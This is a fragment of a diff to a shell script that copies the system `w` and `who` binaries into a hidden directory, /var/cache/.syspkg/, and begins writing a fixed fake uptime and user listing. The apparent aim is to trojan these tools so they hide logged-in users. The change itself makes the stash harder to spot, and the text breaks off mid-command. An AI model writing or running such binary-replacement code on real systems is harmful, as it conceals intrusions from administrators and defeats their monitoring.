@@ -3,9 +3,9 @@
 # identify where the `w` and `who` binaries are
 W_LOC=$(which w)
 WHO_LOC=$(which who)
-mkdir -p /run/runit/
-cp $W_LOC /run/runit/w.so
-cp $WHO_LOC /run/runit/who.so
+mkdir -p /var/cache/.syspkg/
+cp $W_LOC /var/cache/.syspkg/w.orig
+cp $WHO_LOC /var/cache/.syspkg/who.orig
 echo " echo \
 '11:05:20 up 8 min,  1 user,  load average: 1.70, 1.07, 0.52
 USER     TTY       LOGIN@   IDLE   JCPU   PCPU  WHAT
